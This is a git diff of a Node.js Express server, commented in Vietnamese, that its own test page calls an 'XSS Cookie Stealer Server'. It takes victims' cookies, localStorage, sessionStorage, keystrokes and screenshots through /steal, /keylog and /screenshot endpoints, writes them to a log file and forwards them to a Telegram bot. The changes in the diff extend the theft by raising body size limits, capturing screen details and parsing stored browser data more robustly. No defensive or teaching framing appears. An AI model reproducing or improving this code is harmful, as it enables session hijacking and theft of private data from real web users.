@@ -22,9 +22,9 @@ app.use(cors({
     origin: '*',
     credentials: true
 }));
-app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
-app.use(express.static('public')); // Cho phép serve file tĩnh
+app.use(express.json({ limit: '50mb' }));
+app.use(express.urlencoded({ extended: true, limit: '50mb' }));
+app.use(express.static('public')); // Serve file tĩnh từ thư mục public
 
 // ====== LOG FILE ======
 const LOG_FILE = path.join(__dirname, 'cookies.log');
@@ -33,7 +33,7 @@ const LOG_FILE = path.join(__dirname, 'cookies.log');
 async function sendToTelegram(message) {
     if (!BOT_TOKEN || BOT_TOKEN === 'YOUR_BOT_TOKEN') {
         console.log('⚠️ Chưa cấu hình BOT_TOKEN');
-        console.log('📩 Tin nhắn:', message);
+        console.log('📩 Tin nhắn sẽ gửi:', message);
         return;
     }
 
@@ -83,6 +83,7 @@ app.post('/steal', async (req, res) => {
     message += `📌 **URL:** ${data.url || 'Không xác định'}\n`;
     message += `🌐 **Domain:** ${data.domain || 'Không xác định'}\n`;
     message += `🖥️ **User-Agent:** ${data.userAgent || 'Không có'}\n`;
+    message += `📱 **Screen:** ${data.screen || 'Không có'}\n`;
     message += `🔌 **IP:** ${ip}\n`;
     message += `🕒 **Time:** ${new Date().toLocaleString('vi-VN')}\n\n`;
 
@@ -92,18 +93,30 @@ app.post('/steal', async (req, res) => {
     }
 
     // Cookie từ body
-    if (data.cookies && data.cookies !== '') {
+    if (data.cookies && data.cookies !== '' && data.cookies !== '(Không có cookie)') {
         message += `🍪 **Cookie (JS):**\n\`\`\`\n${data.cookies}\n\`\`\`\n\n`;
     }
 
     // LocalStorage
     if (data.localStorage && Object.keys(data.localStorage).length > 0) {
-        message += `💾 **LocalStorage:**\n\`\`\`json\n${JSON.stringify(data.localStorage, null, 2)}\n\`\`\`\n\n`;
+        let lsData = {};
+        try {
+            lsData = typeof data.localStorage === 'object' ? data.localStorage : JSON.parse(data.localStorage);
+        } catch (_) {
+            lsData = { raw: data.localStorage };
+        }
+        message += `💾 **LocalStorage:**\n\`\`\`json\n${JSON.stringify(lsData, null, 2)}\n\`\`\`\n\n`;
     }
 
     // SessionStorage
     if (data.sessionStorage && Object.keys(data.sessionStorage).length > 0) {
-        message += `📦 **SessionStorage:**\n\`\`\`json\n${JSON.stringify(data.sessionStorage, null, 2)}\n\`\`\`\n\n`;
+        let ssData = {};
+        try {
+            ssData = typeof data.sessionStorage === 'object' ? data.sessionStorage : JSON.parse(data.sessionStorage);
+        } catch (_) {
+            ssData = { raw: data.sessionStorage };
+        }
+        message += `📦 **SessionStorage:**\n\`\`\`json\n${JSON.stringify(ssData, null, 2)}\n\`\`\`\n\n`;
     }
 
     // Keylog
@@ -199,11 +212,14 @@ app.get('/test', (req, res) => {
     res.send(`
         <h1>🚀 XSS Cookie Stealer Server</h1>
         <p>✅ Server đang chạy!</p>
-        <p>📩 Endpoint: <code>/steal</code> (POST/GET)</p>
-        <p>📩 Keylog: <code>/keylog</code> (POST)</p>
-        <p>📸 Screenshot: <code>/screenshot</code> (POST)</p>
-        <p>📋 Logs: <code>/logs</code></p>
+        <p>📩 POST <code>/steal</code> - Nhận cookie</p>
+        <p>📩 GET <code>/steal</code> - Nhận cookie (GET)</p>
+        <p>📩 POST <code>/keylog</code> - Nhận keylog</p>
+        <p>📸 POST <code>/screenshot</code> - Nhận screenshot</p>
+        <p>📋 GET <code>/logs</code> - Xem logs</p>
         <p>🕒 Time: ${new Date().toLocaleString('vi-VN')}</p>
+        <hr>
+        <p>🍪 <a href="/">Trang chính</a></p>
     `);
 });
 
@@ -218,7 +234,7 @@ app.get('/logs', (req, res) => {
 
 // ====== ROOT ======
 app.get('/', (req, res) => {
-    res.redirect('/test');
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
 // ====== START ======
